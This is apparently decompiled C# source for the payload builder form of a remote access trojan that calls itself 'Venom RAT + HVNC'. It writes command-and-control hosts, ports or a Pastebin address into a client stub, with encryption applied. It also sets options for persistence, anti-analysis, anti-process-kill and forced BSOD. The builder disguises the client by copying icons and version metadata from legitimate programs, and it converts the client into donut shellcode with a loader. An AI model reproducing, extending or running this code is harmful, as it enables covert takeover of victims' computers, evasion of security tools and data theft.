using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Server.Algorithm;
using Server.Helper;
using Server.Properties;
using Siticone.Desktop.UI.WinForms;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace Server.Forms
{
	// Token: 0x0200009A RID: 154
	public partial class FormBuilder : Form
	{
		// Token: 0x060004AA RID: 1194 RVA: 0x0000476F File Offset: 0x0000296F
		public FormBuilder()
		{
			this.InitializeComponent();
		}

		// Token: 0x060004AB RID: 1195 RVA: 0x00034D28 File Offset: 0x00032F28
		private void SaveSettings()
		{
			try
			{
				List<string> list = new List<string>();
				foreach (object obj in this.YourListPorts.Items)
				{
					string item = (string)obj;
					list.Add(item);
				}
				Settings.Default.Ports = string.Join(",", list);
				List<string> list2 = new List<string>();
				foreach (object obj2 in this.YourListIPs.Items)
				{
					string item2 = (string)obj2;
					list2.Add(item2);
				}
				Settings.Default.IP = string.Join(",", list2);
				Settings.Default.Save();
			}
			catch
			{
			}
		}

		// Token: 0x060004AC RID: 1196 RVA: 0x00034E2C File Offset: 0x0003302C
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox1.Checked)
			{
				this.checkBox1.Text = "ON";
				this.textFilename.Enabled = true;
				this.comboBoxFolder.Enabled = true;
				return;
			}
			this.checkBox1.Text = "OFF";
			this.textFilename.Enabled = false;
			this.comboBoxFolder.Enabled = false;
		}

		// Token: 0x060004AD RID: 1197 RVA: 0x00034E98 File Offset: 0x00033098
		private void Builder_Load(object sender, EventArgs e)
		{
			this.comboBoxFolder.SelectedIndex = 0;
			if (Settings.Default.IP.Length == 0)
			{
				this.YourListIPs.Items.Add("127.0.0.1");
			}
			if (Settings.Default.Paste_bin.Length == 0)
			{
				this.txtPaste_bin.Text = "https://Pastebin.com/";
			}
			try
			{
				foreach (string text in Settings.Default.Ports.Split(new string[]
				{
					","
				}, StringSplitOptions.None))
				{
					if (!string.IsNullOrWhiteSpace(text))
					{
						this.YourListPorts.Items.Add(text.Trim());
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (string text2 in Settings.Default.IP.Split(new string[]
				{
					","
				}, StringSplitOptions.None))
				{
					if (!string.IsNullOrWhiteSpace(text2))
					{
						this.YourListIPs.Items.Add(text2.Trim());
					}
				}
			}
			catch
			{
			}
			if (Settings.Default.Mutex.Length == 0)
			{
				this.txtMutex.Text = this.getRandomCharacters();
			}
		}

		// Token: 0x060004AE RID: 1198 RVA: 0x00034FE4 File Offset: 0x000331E4
		private void CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkPaste_bin.Checked)
			{
				this.txtPaste_bin.Enabled = true;
				this.textIP.Enabled = false;
				this.textPort.Enabled = false;
				this.YourListIPs.Enabled = false;
				this.YourListPorts.Enabled = false;
				this.btnAddIP.Enabled = false;
				this.btnAddPort.Enabled = false;
				this.btnRemoveIP.Enabled = false;
				this.btnRemovePort.Enabled = false;
				return;
			}
			this.txtPaste_bin.Enabled = false;
			this.textIP.Enabled = true;
			this.textPort.Enabled = true;
			this.YourListIPs.Enabled = true;
			this.YourListPorts.Enabled = true;
			this.btnAddIP.Enabled = true;
			this.btnAddPort.Enabled = true;
			this.btnRemoveIP.Enabled = true;
			this.btnRemovePort.Enabled = true;
		}

		// Token: 0x060004AF RID: 1199 RVA: 0x00004788 File Offset: 0x00002988
		private void BtnRemovePort_Click(object sender, EventArgs e)
		{
			if (this.YourListPorts.SelectedItems.Count == 1)
			{
				this.YourListPorts.Items.Remove(this.YourListPorts.SelectedItem);
			}
		}

		// Token: 0x060004B0 RID: 1200 RVA: 0x000350D8 File Offset: 0x000332D8
		private void BtnAddPort_Click(object sender, EventArgs e)
		{
			try
			{
				Convert.ToInt32(this.textPort.Text.Trim());
				using (IEnumerator enumerator = this.YourListPorts.Items.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						if (((string)enumerator.Current).Equals(this.textPort.Text.Trim()))
						{
							return;
						}
					}
				}
				this.YourListPorts.Items.Add(this.textPort.Text.Trim());
				this.textPort.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x060004B1 RID: 1201 RVA: 0x000047B8 File Offset: 0x000029B8
		private void BtnRemoveIP_Click(object sender, EventArgs e)
		{
			if (this.YourListIPs.SelectedItems.Count == 1)
			{
				this.YourListIPs.Items.Remove(this.YourListIPs.SelectedItem);
			}
		}

		// Token: 0x060004B2 RID: 1202 RVA: 0x0003519C File Offset: 0x0003339C
		private void BtnAddIP_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.YourListIPs.Items)
				{
					string text = (string)obj;
					this.textIP.Text = this.textIP.Text.Replace(" ", "");
					if (text.Equals(this.textIP.Text))
					{
						return;
					}
				}
				this.YourListIPs.Items.Add(this.textIP.Text.Replace(" ", ""));
				this.textIP.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x060004B3 RID: 1203 RVA: 0x00035274 File Offset: 0x00033474
		private void BtnBuild_Click(object sender, EventArgs e)
		{
			FormBuilder.<BtnBuild_Click>d__9 <BtnBuild_Click>d__;
			<BtnBuild_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<BtnBuild_Click>d__.<>4__this = this;
			<BtnBuild_Click>d__.<>1__state = -1;
			<BtnBuild_Click>d__.<>t__builder.Start<FormBuilder.<BtnBuild_Click>d__9>(ref <BtnBuild_Click>d__);
		}

		// Token: 0x060004B4 RID: 1204 RVA: 0x000352AC File Offset: 0x000334AC
		private void WriteAssembly(string filename)
		{
			try
			{
				VersionResource versionResource = new VersionResource();
				versionResource.LoadFrom(filename);
				versionResource.FileVersion = this.txtFileVersion.Text;
				versionResource.ProductVersion = this.txtProductVersion.Text;
				versionResource.Language = 0;
				StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
				stringFileInfo["ProductName"] = this.txtProduct.Text;
				stringFileInfo["FileDescription"] = this.txtDescription.Text;
				stringFileInfo["CompanyName"] = this.txtCompany.Text;
				stringFileInfo["LegalCopyright"] = this.txtCopyright.Text;
				stringFileInfo["LegalTrademarks"] = this.txtTrademarks.Text;
				stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
				stringFileInfo["InternalName"] = this.txtOriginalFilename.Text;
				stringFileInfo["OriginalFilename"] = this.txtOriginalFilename.Text;
				stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
				stringFileInfo["FileVersion"] = versionResource.FileVersion;
				versionResource.SaveTo(filename);
			}
			catch (Exception ex)
			{
				throw new ArgumentException("Assembly: " + ex.Message);
			}
		}

		// Token: 0x060004B5 RID: 1205 RVA: 0x00035408 File Offset: 0x00033608
		private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
		{
			if (this.btnAssembly.Checked)
			{
				this.btnClone.Enabled = true;
				this.txtProduct.Enabled = true;
				this.txtDescription.Enabled = true;
				this.txtCompany.Enabled = true;
				this.txtCopyright.Enabled = true;
				this.txtTrademarks.Enabled = true;
				this.txtOriginalFilename.Enabled = true;
				this.txtOriginalFilename.Enabled = true;
				this.txtProductVersion.Enabled = true;
				this.txtFileVersion.Enabled = true;
				return;
			}
			this.btnClone.Enabled = false;
			this.txtProduct.Enabled = false;
			this.txtDescription.Enabled = false;
			this.txtCompany.Enabled = false;
			this.txtCopyright.Enabled = false;
			this.txtTrademarks.Enabled = false;
			this.txtOriginalFilename.Enabled = false;
			this.txtOriginalFilename.Enabled = false;
			this.txtProductVersion.Enabled = false;
			this.txtFileVersion.Enabled = false;
		}

		// Token: 0x060004B6 RID: 1206 RVA: 0x000047E8 File Offset: 0x000029E8
		private void ChkIcon_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkIcon.Checked)
			{
				this.txtIcon.Enabled = true;
				this.btnIcon.Enabled = true;
				return;
			}
			this.txtIcon.Enabled = false;
			this.btnIcon.Enabled = false;
		}

		// Token: 0x060004B7 RID: 1207 RVA: 0x00035514 File Offset: 0x00033714
		private void BtnIcon_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose Icon";
				openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
					{
						string icon = this.GetIcon(openFileDialog.FileName);
						this.txtIcon.Text = icon;
						this.picIcon.ImageLocation = icon;
					}
					else
					{
						this.txtIcon.Text = openFileDialog.FileName;
						this.picIcon.ImageLocation = openFileDialog.FileName;
					}
				}
			}
		}

		// Token: 0x060004B8 RID: 1208 RVA: 0x000355CC File Offset: 0x000337CC
		private string GetIcon(string path)
		{
			try
			{
				string text = Path.GetTempFileName() + ".ico";
				using (FileStream fileStream = new FileStream(text, FileMode.Create))
				{
					IconExtractor.Extract1stIconTo(path, fileStream);
				}
				return text;
			}
			catch
			{
			}
			return "";
		}

		// Token: 0x060004B9 RID: 1209 RVA: 0x00035630 File Offset: 0x00033830
		private void WriteSettings(ModuleDefMD asmDef, string AsmName)
		{
			try
			{
				string randomString = Methods.GetRandomString(32);
				Aes256 aes = new Aes256(randomString);
				X509Certificate2 x509Certificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
				X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
				byte[] inArray;
				using (RSACryptoServiceProvider rsacryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
				{
					byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
					inArray = rsacryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
				}
				foreach (TypeDef typeDef in asmDef.Types)
				{
					asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
					asmDef.Name = Path.GetFileName(AsmName);
					if (typeDef.Name == "Settings")
					{
						foreach (MethodDef methodDef in typeDef.Methods)
						{
							if (methodDef.Body != null)
							{
								for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
								{
									if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
									{
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Ports%")
										{
											if (this.chkPaste_bin.Enabled && this.chkPaste_bin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
											else
											{
												List<string> list = new List<string>();
												foreach (object obj in this.YourListPorts.Items)
												{
													string item = (string)obj;
													list.Add(item);
												}
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Hosts%")
										{
											if (this.chkPaste_bin.Enabled && this.chkPaste_bin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
											else
											{
												List<string> list2 = new List<string>();
												foreach (object obj2 in this.YourListIPs.Items)
												{
													string item2 = (string)obj2;
													list2.Add(item2);
												}
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Install%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.checkBox1.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Folder%")
										{
											methodDef.Body.Instructions[i].Operand = this.comboBoxFolder.Text;
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%File%")
										{
											methodDef.Body.Instructions[i].Operand = this.textFilename.Text;
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Version%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("Venom RAT + HVNC ", ""));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Key%")
										{
											methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%MTX%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtMutex.Text);
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Anti%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkAnti.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkAntiProcess.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Certificate%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%BSOD%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkBsod.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
										{
											if (this.chkPaste_bin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtPaste_bin.Text);
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Delay%")
										{
											methodDef.Body.Instructions[i].Operand = this.numDelay.Value.ToString();
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Group%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtGroup.Text);
										}
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				throw new ArgumentException("WriteSettings: " + ex.Message);
			}
		}

		// Token: 0x060004BA RID: 1210 RVA: 0x00035F04 File Offset: 0x00034104
		public string getRandomCharacters()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= new Random().Next(10, 20); i++)
			{
				int index = this.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
				stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x060004BB RID: 1211 RVA: 0x00035F60 File Offset: 0x00034160
		private void BtnClone_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable (*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
					this.txtOriginalFilename.Text = (versionInfo.InternalName ?? string.Empty);
					this.txtDescription.Text = (versionInfo.FileDescription ?? string.Empty);
					this.txtCompany.Text = (versionInfo.CompanyName ?? string.Empty);
					this.txtProduct.Text = (versionInfo.ProductName ?? string.Empty);
					this.txtCopyright.Text = (versionInfo.LegalCopyright ?? string.Empty);
					this.txtTrademarks.Text = (versionInfo.LegalTrademarks ?? string.Empty);
					int fileMajorPart = versionInfo.FileMajorPart;
					this.txtFileVersion.Text = string.Concat(new string[]
					{
						versionInfo.FileMajorPart.ToString(),
						".",
						versionInfo.FileMinorPart.ToString(),
						".",
						versionInfo.FileBuildPart.ToString(),
						".",
						versionInfo.FilePrivatePart.ToString()
					});
					this.txtProductVersion.Text = string.Concat(new string[]
					{
						versionInfo.FileMajorPart.ToString(),
						".",
						versionInfo.FileMinorPart.ToString(),
						".",
						versionInfo.FileBuildPart.ToString(),
						".",
						versionInfo.FilePrivatePart.ToString()
					});
				}
			}
		}

		// Token: 0x060004BC RID: 1212 RVA: 0x00036148 File Offset: 0x00034348
		private void btnShellcode_Click(object sender, EventArgs e)
		{
			if ((!this.chkPaste_bin.Checked && this.YourListIPs.Items.Count == 0) || this.YourListPorts.Items.Count == 0)
			{
				return;
			}
			if (this.checkBox1.Checked)
			{
				if (string.IsNullOrWhiteSpace(this.textFilename.Text) || string.IsNullOrWhiteSpace(this.comboBoxFolder.Text))
				{
					return;
				}
				if (!this.textFilename.Text.EndsWith("exe"))
				{
					SiticoneTextBox siticoneTextBox = this.textFilename;
					siticoneTextBox.Text += ".exe";
				}
			}
			if (string.IsNullOrWhiteSpace(this.txtMutex.Text))
			{
				this.txtMutex.Text = this.getRandomCharacters();
			}
			if (this.chkPaste_bin.Checked && string.IsNullOrWhiteSpace(this.txtPaste_bin.Text))
			{
				return;
			}
			ModuleDefMD moduleDefMD = null;
			try
			{
				ModuleDefMD moduleDefMD2;
				moduleDefMD = (moduleDefMD2 = ModuleDefMD.Load("Stub/Client.exe", null));
				try
				{
					string text = Path.Combine(Application.StartupPath, "Stub\\tempClient.exe");
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					File.Copy(Path.Combine(Application.StartupPath, "Stub\\Client.exe"), text);
					this.btnBuild.Enabled = false;
					this.WriteSettings(moduleDefMD, text);
					moduleDefMD.Write(text);
					moduleDefMD.Dispose();
					if (this.btnAssembly.Checked)
					{
						this.WriteAssembly(text);
					}
					if (this.chkIcon.Checked && !string.IsNullOrEmpty(this.txtIcon.Text))
					{
						IconInjector.InjectIcon(text, this.txtIcon.Text);
					}
					string text2 = "";
					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = ".bin (*.bin)|*.bin";
						saveFileDialog.InitialDirectory = Application.StartupPath;
						saveFileDialog.OverwritePrompt = false;
						saveFileDialog.FileName = "Client";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							text2 = saveFileDialog.FileName;
						}
					}
					string text3 = Path.Combine(Application.StartupPath, "Plugins\\donut.exe");
					if (!File.Exists(text3))
					{
						File.WriteAllBytes(text3, Resources.donut);
					}
					Process process = new Process();
					process.StartInfo.FileName = text3;
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.Arguments = "-f " + text + " -o " + text2;
					process.Start();
					process.WaitForExit();
					process.Close();
					if (File.Exists(text2))
					{
						File.WriteAllText(text2 + "loader.cs", Resources.ShellcodeLoader.Replace("%qwqdanchun%", Convert.ToBase64String(File.ReadAllBytes(text2))));
						File.WriteAllText(text2 + ".b64", Convert.ToBase64String(File.ReadAllBytes(text2)));
					}
					File.Delete(text);
					File.Delete(text3);
					MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					this.SaveSettings();
					base.Close();
				}
				finally
				{
					if (moduleDefMD2 != null)
					{
						moduleDefMD2.Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				if (moduleDefMD != null)
				{
					moduleDefMD.Dispose();
				}
				this.btnBuild.Enabled = true;
			}
		}

		// Token: 0x060004BD RID: 1213 RVA: 0x00004828 File Offset: 0x00002A28
		private void siticoneGradientButton1_Click(object sender, EventArgs e)
		{
			Process.Start("https://canyouseeme.org/");
		}

		// Token: 0x060004BE RID: 1214 RVA: 0x00002BC8 File Offset: 0x00000DC8
		private void siticoneGradientButton3_Click(object sender, EventArgs e)
		{
			Process.Start("https://vimeo.com/user140055609");
		}

		// Token: 0x060004BF RID: 1215 RVA: 0x00002BC8 File Offset: 0x00000DC8
		private void siticoneGradientButton5_Click(object sender, EventArgs e)
		{
			Process.Start("https://vimeo.com/user140055609");
		}

		// Token: 0x040003BC RID: 956
		private readonly Random random = new Random();

		// Token: 0x040003BD RID: 957
		private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
	}
}
